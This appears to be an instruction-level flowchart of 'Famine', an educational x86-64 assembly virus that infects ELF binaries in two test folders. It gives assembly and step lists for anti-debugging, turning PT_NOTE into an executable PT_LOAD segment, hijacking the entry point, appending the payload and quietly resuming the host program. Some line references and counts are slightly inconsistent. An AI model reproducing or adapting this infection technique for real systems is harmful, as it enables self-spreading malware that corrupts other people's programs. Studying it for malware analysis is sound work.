╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                 FAMINE VIRUS - SEQUENTIAL EXECUTION FLOWCHART                        ║
║                   Step-by-Step Instruction Trace (Non-Encrypted Path)                ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝


══════════════════════════════════════════════════════════════════════════════════════════
 PHASE 0: COMPILATION & LINKING (main.s includes virus.s)
══════════════════════════════════════════════════════════════════════════════════════════

 1.  Assembler processes main.s
    ├─ %include "include. s"         ← Define all syscall numbers, constants
    ├─ %include "utils.s"            ← Utility functions (str_len, str_copy, search_substring)
    ├─ %include "check_elf_64_exec.s" ← ELF validation
    └─ %include "list_files_recursive.s" ← Directory traversal
    
 2. Assembler processes virus.s (included at line 13 of main.s)
    └─ virus_start label defined at offset ~0x1393
    
 3. Final binary layout:
    ├─ Regular Famine code (_start in main.s)
    └─ Virus payload code (virus_start in virus.s) appended after


══════════════════════════════════════════════════════════════════════════════════════════
 PHASE 1: ORIGINAL FAMINE BINARY EXECUTION (_start from main.s)
══════════════════════════════════════════════════════════════════════════════════════════

┌─ START:  User runs $ ./Famine
│
├─ INSTRUCTION 1-7 (main.s lines 26-34 in virus.s - virus payload _start):
│  push rbp                  ; Save old frame pointer
│  mov rbp, rsp              ; Establish new frame
│  push rbx                  ; Save callee-saved registers
│  push r12
│  push r13
│  push r14
│  push r15
│  └─> Stack now holds 8 saved registers (64 bytes)
│
├─ INSTRUCTION 8 (virus. s line 40-45): ANTI-DEBUGGING CHECK
│  mov eax, SYS_PTRACE       ; SYS_PTRACE = 101
│  mov edi, PTRACE_TRACEME   ; = 0
│  xor esi, esi              ; arg1 = 0
│  xor edx, edx              ; arg2 = 0
│  xor r10d, r10d            ; arg3 = 0
│  syscall                   ; Call ptrace(PTRACE_TRACEME)
│  └─> rax = 0 (not being debugged)
│
├─ INSTRUCTION 9 (virus. s line 48): TEST RETURN VALUE
│  cmp rax, -1               ; Check if debugger detected
│  je .being_debugged        ; If rax == -1, jump to debug handler
│  └─> Not taken (rax = 0, not -1)
│
├─ INSTRUCTION 10 (virus.s line 55): DECRYPTION CHECK
│  call . get_decrypt_base    ; Get position-independent address
│  . get_decrypt_base:        ; After call, rip pushed on stack
│  pop r15                   ; r15 = address of . get_decrypt_base label
│  sub r15, . get_decrypt_base - virus_start
│  └─> r15 = base address of virus_start
│
├─ INSTRUCTION 11 (virus. s line 61-63): CHECK ENCRYPTED FLAG
│  movzx eax, byte [r15 + encrypted_flag - virus_start]
│  test al, al               ; Check if flag == 0
│  jz .not_encrypted         ; If 0, skip decryption
│  └─> TAKEN: Jump to . not_encrypted (file is not encrypted)
│
├─ INSTRUCTION 12 (virus. s line 106-111): GET BASE AGAIN (after decrypt)
│  .not_encrypted: 
│  call .get_base_after_decrypt
│  .get_base_after_decrypt:
│  pop r15                   ; Get position again
│  sub r15, . get_base_after_decrypt - virus_start
│  └─> r15 still = base address of virus_start
│
├─ INSTRUCTION 13 (virus.s line 115-119): GET BASE ADDRESS FOR REAL
│  call .get_base            ; Get RIP for position-independence
│  .get_base:
│  pop r15                   ; r15 = address of this label
│  sub r15, .get_base - virus_start
│  └─> r15 = proper base address of virus_start
│
├─ INSTRUCTION 14 (virus.s line 122-124): CHECK IF ORIGINAL FAMINE
│  mov rax, [r15 + original_entry_storage - virus_start]
│  test rax, rax             ; Check if original_entry_storage == 0
│  jnz .run_as_virus         ; If not zero, we're virus in infected binary
│  └─> NOT TAKEN (rax = 0, we're the original Famine binary)
│
├─ INSTRUCTION 15 (virus.s line 128-135): INITIALIZE & LIST /tmp/test
│  mov qword [rel file_count], 0
│  └─> file_count = 0
│
│  mov rsi, firstDir          ; rsi = "/tmp/test"
│  lea rdi, [rel path_buffer] ; rdi = address of path_buffer
│  call str_copy             ; Copy "/tmp/test" to path_buffer
│  └─> path_buffer now contains "/tmp/test"
│
│  lea rdi, [rel path_buffer]
│  call list_files_recursive ; CALL FUNCTION 1
│  └─> JUMP to list_files_recursive (in list_files_recursive.s)


   ╔═══════════════════════════════════════════════════════════════════════╗
   ║   NESTED CALL #1: list_files_recursive("/tmp/test")                  ║
   ║   (list_files_recursive.s lines 20-219)                              ║
   ╚═══════════════════════════════════════════════════════════════════════╝
   
   INSTRUCTION 1A (lines 21-28):
   push rbp                    ; Save frame pointer
   mov rbp, rsp                ; New frame
   sub rsp, BUFFER_SIZE + STACK_LOCALS  ; Allocate 4096 + 128 bytes
   and rsp, -16                ; Align to 16 bytes
   └─> Stack now has local variables: 
       [rbp-8]   = fd
       [rbp-16]  = path_length
       [rbp-24]  = nread
       [rbp-32]  = position
       [rbp-40]  = saved r12
       [rbp-48]  = saved r13
       [rbp-56]  = saved r14
       [rbp-64]  = saved r15
       [rbp-72]  = saved rbx
       [rbp-80]  = d_type
       [rbp-88]  = d_reclen
       [rbp-128 to rbp-4224] = dir_buffer for getdents64
   
   INSTRUCTION 2A (lines 44-51):
   mov [rbp-40], r12           ; Save r12 (path pointer)
   mov [rbp-48], r13           ; Save r13 (fd)
   mov [rbp-56], r14           ; Save r14 (nread)
   mov [rbp-64], r15           ; Save r15 (dirent ptr)
   mov [rbp-72], rbx           ; Save rbx (d_reclen)
   mov r12, rdi                ; r12 = path ("/tmp/test")
   
   INSTRUCTION 3A (lines 54-56):
   mov rdi, r12                ; rdi = path
   call str_len                ; Get length of path
   mov [rbp-16], rax           ; Save path length in local var
   
   INSTRUCTION 4A (lines 59-64): OPEN DIRECTORY
   mov eax, SYS_OPENAT         ; SYS_OPENAT = 257
   mov edi, AT_FDCWD           ; AT_FDCWD = -100
   mov rsi, r12                ; rsi = "/tmp/test"
   mov edx, O_RDONLY_DIR       ; O_RDONLY | O_DIRECTORY = 0x10000
   xor r10d, r10d              ; mode = 0 (ignored)
   syscall
   └─> rax = file descriptor (e.g., 3)
   
   INSTRUCTION 5A (lines 67-71):
   test rax, rax               ; Check if open succeeded
   js .done                    ; If negative, jump to cleanup
   └─> NOT TAKEN (rax is positive)
   
   mov [rbp-8], rax            ; Save fd in [rbp-8]
   mov r13, rax                ; r13 = fd
   
   INSTRUCTION 6A (lines 73-79): GETDENTS64 LOOP START
   . read_loop:
   mov eax, SYS_GETDENTS64     ; SYS_GETDENTS64 = 217
   mov edi, r13d               ; edi = fd
   lea rsi, [rbp - BUFFER_SIZE - STACK_LOCALS]  ; rsi = buffer on stack
   mov edx, BUFFER_SIZE        ; edx = 4096 (buffer size)
   syscall
   └─> rax = bytes read (linux_dirent entries)
   
   INSTRUCTION 7A (lines 82-92):
   test rax, rax               ; Check bytes read
   jle .close_dir              ; If <= 0, done reading
   └─> If rax > 0, continue processing
   
   mov [rbp-24], rax           ; Save nread
   mov qword [rbp-32], 0       ; pos = 0
   mov r14, rax                ; r14 = nread
   
   INSTRUCTION 8A (lines 89-96): PROCESS EACH ENTRY
   . process_entry:
   mov rax, [rbp-32]           ; rax = current position
   cmp rax, r14                ; Compare with nread
   jge .read_loop              ; If pos >= nread, read more
   └─> NOT TAKEN (pos = 0, nread > 0)
   
   lea r15, [rbp - BUFFER_SIZE - STACK_LOCALS]  ; r15 = buffer
   add r15, rax                ; r15 = &dirent[pos]
   
   INSTRUCTION 9A (lines 99-105):
   movzx ebx, word [r15 + 16]  ; rbx = d_reclen (bytes 16-17 of dirent)
   movzx eax, byte [r15 + 18]  ; eax = d_type (byte 18)
   lea rcx, [r15 + 19]         ; rcx = d_name (starts at byte 19)
   
   INSTRUCTION 10A (lines 108-115): SKIP "." and ".."
   cmp byte [rcx], '.'         ; Check if first char is '.'
   jne . not_dot                ; If not, continue
   cmp byte [rcx+1], 0         ; Check if next char is null
   je .next_entry              ; If yes, skip "."
   cmp byte [rcx+1], '.'       ; Check if second char is '.'
   jne .not_dot                ; If not, continue
   cmp byte [rcx+2], 0         ; Check if third char is null
   je .next_entry              ; If yes, skip ". ."
   
   .not_dot:
   └─> Entry is not "." or ".."
   
   INSTRUCTION 11A (lines 119-120):
   mov [rbp-80], rax           ; Save d_type
   mov [rbp-88], rbx           ; Save d_reclen
   
   INSTRUCTION 12A (lines 123-136): BUILD FULL PATH
   mov rdi, r12                ; rdi = path buffer
   mov rax, [rbp-16]           ; rax = original path length
   add rdi, rax                ; rdi points to end of path
   
   cmp byte [rdi-1], '/'       ; Check if last char is '/'
   je .no_slash                ; If yes, skip adding '/'
   mov byte [rdi], '/'         ; Add '/'
   inc rdi                      ; Move pointer forward
   
   . no_slash:
   mov rsi, rcx                ; rsi = d_name
   call str_copy               ; Copy d_name to end of path
   └─> path now = "/tmp/test/filename"
   
   INSTRUCTION 13A (line 139):
   mov rax, [rbp-80]           ; Restore d_type
   
   INSTRUCTION 14A (lines 142-143): CHECK FILE TYPE
   cmp al, DT_REG              ; DT_REG = 8 (regular file)
   jne .check_dir              ; If not regular file, check if directory
   
   CASE A: Regular File Found
   └─> Jump to line 164 (print path)
   
       mov rdi, r12
       call print_string        ; Print the file path
       
       push rax                 ; Save rax
       mov eax, SYS_WRITE       ; Write newline
       mov edi, STDOUT
       lea rsi, [rel newline]
       mov edx, 1
       syscall
       pop rax
       
       jmp .restore_path        ; Restore path and continue
   
   CASE B: Directory Found
   . check_dir:
   cmp al, DT_DIR              ; DT_DIR = 4
   jne .restore_path           ; If not directory, skip
   
   ├─ RECURSIVE CALL (line 186):
   │  mov rdi, r12              ; rdi = full path
   │  call list_files_recursive ; RECURSIVE CALL to process subdirectory
   │  └─> Recurses into subdirectory (same logic as above)
   │
   └─ Continue with next entry
   
   INSTRUCTION 15A (lines 188-191): RESTORE PATH
   . restore_path:
   mov rax, [rbp-16]           ; rax = original path length
   mov byte [r12 + rax], 0     ; Null-terminate at original length
   └─> Removes the subdirectory/filename from path
   
   INSTRUCTION 16A (lines 196-201): NEXT ENTRY
   . next_entry:
   mov rax, [rbp-32]           ; rax = pos
   add rax, [rbp-88]           ; rax += d_reclen
   mov [rbp-32], rax           ; Update pos
   jmp .process_entry          ; Loop to process next entry
   
   INSTRUCTION 17A (lines 203-207): CLOSE DIRECTORY
   . close_dir:
   mov eax, SYS_CLOSE
   mov edi, r13d
   syscall
   
   INSTRUCTION 18A (lines 210-219): RETURN FROM list_files_recursive
   .done:
   mov r12, [rbp-40]           ; Restore r12
   mov r13, [rbp-48]           ; Restore r13
   mov r14, [rbp-56]           ; Restore r14
   mov r15, [rbp-64]           ; Restore r15
   mov rbx, [rbp-72]           ; Restore rbx
   mov rsp, rbp
   pop rbp
   ret
   └─> Return to main. s virus. s line 135


├─ INSTRUCTION 16 (virus.s lines 137-139): CHECK ELF64 EXECUTABLES
│  lea rdi, [rel file_list]    ; rdi = file list
│  mov rsi, [rel file_count]   ; rsi = number of files
│  call check_elf64_exec       ; Validate and print ELF files
│  
│  ╔═══════════════════════════════════════════════════════════════╗
│  ║  NESTED CALL #2:  check_elf64_exec(file_list, file_count)     ║
│  ║  (check_elf_64_exec. s lines 20-77)                           ║
│  ╚═══════════════════════════════════════════════════════════════╝
│  
│  For each file in file_list: 
│  ├─ Open file for reading
│  ├─ Read 64-byte ELF header
│  ├─ Check ELF magic (0x7f 'ELF')
│  ├─ Check class (64-bit)
│  ├─ Check e_type (2=ET_EXEC or 3=ET_DYN)
│  └─ Print validation result
│
│  Then for VALID ELF64 executables:
│  └─ Call add_pt_load(filepath)
│
│  ╔═══════════════════════════════════════════════════════════════╗
│  ║        NESTED CALL #3: add_pt_load(filepath)                 ║
│  ║        (main.s lines 46-406)                                 ║
│  ╚═══════════════════════════════════════════════════════════════╝
│  
│  This is the INFECTION ENGINE: 
│
│  INSTRUCTION 1B (lines 47-62):
│  push rbp; mov rbp, rsp
│  sub rsp, 80
│  push r12, r13, r14, r15, rbx
│  mov r12, rdi                    ; r12 = filepath
│  
│  call . get_virus_base
│  pop r15
│  sub r15, . get_virus_base - virus_start
│  └─> r15 = base address of virus_start
│
│  INSTRUCTION 2B (lines 65-75): OPEN FILE FOR R/W
│  mov eax, SYS_OPENAT            ; Open file
│  mov edi, AT_FDCWD
│  mov rsi, r12
│  mov edx, O_RDWR                ; Read-write mode
│  xor r10d, r10d
│  syscall
│  test rax, rax
│  js .add_pt_load_fail            ; If failed, skip
│  mov r13, rax                    ; r13 = fd
│
│  INSTRUCTION 3B (lines 77-87): GET FILE SIZE
│  mov eax, SYS_LSEEK              ; Seek to end
│  mov edi, r13d
│  xor esi, esi
│  mov edx, SEEK_END
│  syscall
│  └─> rax = file size
│  mov [rbp-8], rax                ; Save file size
│
│  INSTRUCTION 4B (lines 89-101): READ ELF HEADER
│  mov eax, SYS_LSEEK              ; Seek to start
│  mov edi, r13d
│  xor esi, esi
│  xor edx, edx
│  syscall
│  
│  mov eax, SYS_READ               ; Read ELF header
│  mov edi, r13d
│  lea rsi, [rel elf_header_buf]
│  mov edx, 64
│  syscall
│  cmp rax, 64
│  jl .add_pt_load_close_fail       ; If < 64 bytes, fail
│
│  INSTRUCTION 5B (lines 106-165): SIGNATURE CHECK
│  └─> Search entire file for virus signature
│      If found: 
│      ├─ File already infected
│      ├─ Close and skip
│      └─ Jump to . add_pt_load_close_fail
│      
│      If not found:
│      └─ Continue with infection
│
│  INSTRUCTION 6B (lines 167-213): READ PROGRAM HEADERS
│  Seek to beginning, re-read ELF header
│  
│  mov rax, [rdi + e_entry]        ; Save original entry point
│  mov [rbp-24], rax
│  
│  mov r14, [rdi + e_phoff]        ; Get e_phoff
│  movzx ebx, word [rdi + e_phnum] ; Get e_phnum (number of phdrs)
│  movzx eax, word [rdi + e_phentsize]  ; Get phdr size
│  
│  Seek to phdrs, read all phdrs into elf_phdr_buf
│
│  INSTRUCTION 7B (lines 215-231): FIND PT_NOTE
│  . find_note_loop:
│  For each program header:
│  └─ If p_type == PT_NOTE: 
│     ├─ Found PT_NOTE segment
│     └─ Jump to .found_note_main
│  
│  If no PT_NOTE found:
│  └─ File not suitable for infection (skip)
│
│  INSTRUCTION 8B (lines 233-278): CALCULATE NEW VADDR
│  . found_note_main:
│  
│  Scan all LOAD segments to find max vaddr + memsz
│  └─> r8 = maximum vaddr end
│  
│  Calculate new vaddr: 
│  ├─ Get file_size % 0x1000 (page offset)
│  ├─ Align r8 up to next page boundary
│  ├─ Add page offset to maintain alignment
│  └─> r8 = properly aligned new vaddr
│
│  INSTRUCTION 9B (lines 283-298): CONVERT PT_NOTE TO PT_LOAD
│  Set PT_NOTE segment to: 
│  ├─ p_type = PT_LOAD
│  ├─ p_flags = PF_R | PF_W | PF_X (7)
│  ├─ p_offset = file_size
│  ├─ p_vaddr = r8 (calculated above)
│  ├─ p_paddr = r8
│  ├─ p_filesz = virus_end - virus_start
│  ├─ p_memsz = virus_end - virus_start
│  └─ p_align = 0x1000
│
│  INSTRUCTION 10B (lines 300-333): WRITE MODIFIED HEADERS
│  Update entry point: 
│  ├─ new_entry = new_vaddr + (_start - virus_start)
│  └─ Write to e_entry
│
│  Write modified program headers back to file
│  Write modified ELF header back to file
│
│  INSTRUCTION 11B (lines 335-371): APPEND VIRUS CODE
│  Copy virus_start to virus_end to a temporary buffer
│  Patch original_entry_storage with calculated offset: 
│  └─ offset = original_entry - new_entry
│
│  Seek to end of file
│  Write virus payload (virus_end - virus_start bytes)
│
│  INSTRUCTION 12B (lines 373-387): CLOSE & PRINT
│  Close file descriptor
│  Print "infected /path/to/file"
│  Jump to .add_pt_load_done
│
│  . add_pt_load_done: 
│  Restore all registers and return


├─ INSTRUCTION 17 (virus. s lines 142-146): PROCESS /tmp/test2
│  mov rsi, secondDir          ; rsi = "/tmp/test2"
│  lea rdi, [rel path_buffer]
│  call str_copy               ; Copy to path_buffer
│  lea rdi, [rel path_buffer]
│  call list_files_recursive   ; Recursively scan /tmp/test2
│  └─> Same as INSTRUCTION 15


├─ INSTRUCTION 18 (virus.s lines 148-150): CHECK /tmp/test2 ELF FILES
│  lea rdi, [rel file_list]
│  mov rsi, [rel file_count]
│  call check_elf64_exec       ; Same as INSTRUCTION 16
│
├─ INSTRUCTION 19 (virus.s line 152): JUMP TO END
│  jmp _end


├─ INSTRUCTION 20 (_end, line 565-567):
│  _end:
│  mov eax, SYS_EXIT           ; SYS_EXIT = 60
│  xor edi, edi                ; exit code = 0
│  syscall
│  └─> Program terminates


══════════════════════════════════════════════════════════════════════════════════════════
 PHASE 2: INFECTED BINARY EXECUTION (when user runs infected binary)
══════════════════════════════════════════════════════════════════════════════════════════

User runs:  $ /tmp/test/infected_binary

1.  Kernel loads binary
2. Entry point is set to:  new_vaddr + (_start - virus_start)
3. CPU jumps to virus. s _start (virus code executes first!)

INSTRUCTION 1 (virus.s lines 28-49): SAME AS PHASE 1 (1-9)
└─> Anti-debugging check (passes)
└─> Decryption check (skipped, not encrypted)
└─> Get base address

INSTRUCTION 2 (virus. s line 122): KEY DIFFERENCE
mov rax, [r15 + original_entry_storage - virus_start]
test rax, rax
jnz .run_as_virus
└─> THIS TIME:  rax is NOT zero (contains offset to original entry)
└─> JMP to . run_as_virus is TAKEN! 


   ╔═══════════════════════════════════════════════════════════════════════╗
   ║              VIRUS EXECUTION PATH (infected binary)                   ║
   ║              (_start. run_as_virus, virus.s lines 235-307)           ║
   ╚═══════════════════════════════════════════════════════════════════════╝

   INSTRUCTION 1C (lines 243-246):
   call .get_start_rip
   . get_start_rip: 
   pop rax                    ; rax = address of . get_start_rip
   sub rax, . get_start_rip - _start
   └─> rax = current address of _start
   
   INSTRUCTION 2C (line 249):
   add rax, [r15 + original_entry_storage - virus_start]
   └─> rax = original entry point (binary's real _start)
   
   INSTRUCTION 3C (line 250):
   push rax                   ; Save original entry on stack
   
   INSTRUCTION 4C (lines 252-254):
   sub rsp, VIRUS_STACK_SIZE  ; Allocate 16KB for virus stack buffers
   and rsp, ~15               ; 16-byte align
   
   INSTRUCTION 5C (lines 257-269): INFECT /tmp/test
   mov qword [rsp], 0         ; file_count = 0
   
   lea rdi, [rsp + 8]         ; Path buffer on stack
   lea rsi, [r15 + v_firstDir - virus_start]  ; "/tmp/test"
   call virus_str_copy        ; Copy to stack buffer
   
   lea rdi, [rsp + 8]         ; Path
   lea rsi, [rsp]             ; File count pointer
   lea rdx, [rsp + 4104]      ; File list buffer
   call virus_list_and_infect ; RECURSIVE INFECTION! 
   
   └─> virus_list_and_infect processes directory: 
       ├─ Opens /tmp/test
       ├─ getdents64 to read entries
       ├─ For each file:
       │  ├─ If regular file: call virus_infect_elf (TRY TO INFECT)
       │  └─ If directory: recursively call virus_list_and_infect
       └─ Closes directory
   
   INSTRUCTION 6C (lines 271-281): INFECT /tmp/test2 (if not BONUS_MODE)
   └─> Same as 5C
   
   INSTRUCTION 7C (lines 284-307): RETURN TO ORIGINAL BINARY
   mov rsp, rbp               ; Restore stack to original state
   mov rax, [rbp - 48]        ; Get original entry point from stack
   pop rbp                    ; Restore rbp
   
   xor rdi, rdi               ; Clear registers
   xor rsi, rsi
   xor rdx, rdx
   xor rcx, rcx
   xor r8, r8
   xor r9, r9
   xor r10, r10
   xor r11, r11
   
   jmp rax                    ; Jump to original entry point
   └─> Binary executes normally from here, user never knows!


══════════════════════════════════════════════════════════════════════════════════════════
 PHASE 3: VIRUS_INFECT_ELF SUBROUTINE (virus.s lines 589-1050)
══════════════════════════════════════════════════════════════════════════════════════════

Called during infected binary execution to spread virus. 

rdi = filepath to infect
r15 = virus_start (base address)

INSTRUCTION 1D:  Setup stack frame
INSTRUCTION 2D: Open file for r/w
INSTRUCTION 3D: Get file size
INSTRUCTION 4D: Read ELF header (64 bytes)
INSTRUCTION 5D:  Validate ELF magic, class, e_type
INSTRUCTION 6D:  Signature check (search entire file)
INSTRUCTION 7D: Read program headers
INSTRUCTION 8D: Find PT_NOTE segment
INSTRUCTION 9D: Find max vaddr in LOAD segments
INSTRUCTION 10D:  Convert PT_NOTE to PT_LOAD
INSTRUCTION 11D:  Patch and write headers
INSTRUCTION 12D: Copy virus to temp buffer
INSTRUCTION 13D:  Patch original_entry_storage with offset
INSTRUCTION 14D:  Append virus to end of file
INSTRUCTION 15D: Close file, return
└─> Same logic as add_pt_load in main.s


══════════════════════════════════════════════════════════════════════════════════════════
 COMPLETE EXECUTION SEQUENCE SUMMARY
══════════════════════════════════════════════════════════════════════════════════════════

                              FAMINE STARTS HERE
                                      │
                         virus.s _start (main execution)
                                      │
                    ┌───────────────────┴───────────────────┐
                    │                                       │
              (original_entry_storage == 0)        (original_entry_storage != 0)
              Original Famine Binary               Infected Binary
                    │                                       │
        ┌───────────┴────────────┐              ┌──────────┴──────────┐
        │                        │              │                     │
   /tmp/test                /tmp/test2      VIRUS PAYLOAD        Return to Original
        │                        │           EXECUTION            Entry Point
        │                        │              │
   list_files_         list_files_          virus_list_
   recursive()         recursive()           and_infect()
        │                        │              │
   For each                 For each        For each file: 
   file/dir:                file/dir:       ├─ Try to infect
        │                        │          │  ├─ Validate ELF
   ┌────┴────┐            ┌────┴────┐      │  ├─ Check signature
   │          │            │          │      │  ├─ Read phdrs
  File      Dir           File      Dir      │  ├─ Find PT_NOTE
   │          │            │          │      │  ├─ Convert to PT_LOAD
   │       Recurse          │       Recurse   │  ├─ Patch entry
   │          │             │          │      │  └─ Append virus
   ▼          ▼             ▼          ▼      │
  Store in  (continue      Store in  (continue
  file_list  to next)       file_list  to next)
              │                         │
              ▼                         ▼
         check_elf64_exec()    (repeat for subdirs)


══════════════════════════════════════════════════════════════════════════════════════════
 KEY DECISION POINTS IN SEQUENTIAL FLOW
══════════════════════════════════════════════════════════════════════════════════════════

1. DEBUGGER CHECK (line 48):
   ├─ If debugged (rax == -1): EXIT
   └─ If not debugged (rax == 0): CONTINUE

2. ENCRYPTION CHECK (line 62):
   ├─ If encrypted (flag == 1): DECRYPT CODE
   └─ If not encrypted (flag == 0): SKIP DECRYPTION

3. BINARY TYPE CHECK (line 123):
   ├─ If original_entry_storage == 0: RUN ORIGINAL FAMINE (scan & infect)
   └─ If original_entry_storage != 0: RUN VIRUS (spread infection)

4. DIRECTORY ENTRY TYPE (line 497):
   ├─ If d_type == DT_REG (8): PRINT FILE PATH
   ├─ If d_type == DT_DIR (4): RECURSIVELY SCAN
   └─ If neither: SKIP

5. ELF VALIDATION (lines 644-656):
   ├─ If not ELF magic: HANDLE AS NON-ELF
   ├─ If not 64-bit: SKIP
   ├─ If not ET_EXEC or ET_DYN: SKIP
   └─ If valid:  PREPARE FOR INFECTION

6. SIGNATURE CHECK (lines 677-724):
   ├─ If signature found: SKIP (already infected)
   └─ If signature not found:  PROCEED WITH INFECTION

7. PT_NOTE SEARCH (lines 789-801):
   ├─ If found:  CONVERT TO PT_LOAD
   └─ If not found: SKIP FILE (can't infect without PT_NOTE)


══════════════════════════════════════════════════════════════════════════════════════════
 INSTRUCTION COUNT & TIMING (APPROXIMATE)
══════════════════════════════════════════════════════════════════════════════════════════

Phase 1 (Original Famine):
├─ Anti-debug check:            ~10 instructions
├─ Encryption/decryption:      ~10-50 instructions (depending on state)
├─ Directory scan (/tmp/test):  ~1000+ instructions (multiple syscalls)
├─ ELF validation:             ~100+ instructions (per file)
├─ Infection per file:         ~500+ instructions (multiple syscalls, file I/O)
└─ Directory scan (/tmp/test2): ~1000+ instructions
└─ Total Phase 1:               ~3000-5000+ instructions

Phase 2 (Infected Binary Virus Execution):
├─ Anti-debug, decrypt, setup:   ~50 instructions
├─ Virus list and infect:       ~2000+ instructions (recursive)
└─ Return to original entry:     ~20 instructions
└─ Total Phase 2:                ~2000-3000+ instructions

Actual wall-clock time depends on:
├─ Number of files in /tmp/test and /tmp/test2
├─ File sizes (for I/O operations)
├─ Disk speed
└─ System load

